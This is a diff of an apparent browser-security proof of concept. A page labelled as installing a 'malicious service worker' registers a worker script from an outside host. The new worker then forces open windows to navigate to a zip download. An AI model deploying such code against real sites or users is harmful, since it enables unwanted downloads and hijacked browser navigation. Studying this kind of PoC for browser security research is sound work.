@@ -1,26 +1,10 @@
-<!DOCTYPE html>
-<html>
-	<head>
-		<meta charset="utf-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<title>PoC</title>
-		<script>
-			if ("serviceWorker" in navigator) {
-				addEventListener("load", async () => {
-					const registration = await navigator.serviceWorker.register("https://cr.kungfoo.net/yao/downloads/sw.js");
-					if (registration.installing) {
-						location.reload();
-					} else {
-						location = "https://cr.kungfoo.net/yao/downloads/iframe.html";
-					}
-				});
-			}
-		</script>
-	</head>
-	<body>
-		<br>
-		<center>
-			<h1>This page will install a malicious service worker.</h1>
-		</center>
-	</body>
-</html>
+'use strict';
+
+self.addEventListener("install", () => {
+    self.skipWaiting();
+});
+
+self.addEventListener("message", async (e) => {
+    let clients = await self.clients.matchAll({ includeUncontrolled: true, type: "window" });
+    clients[0].navigate("https://www.learningcontainer.com/wp-content/uploads/2020/05/sample-zip-file.zip");
+});
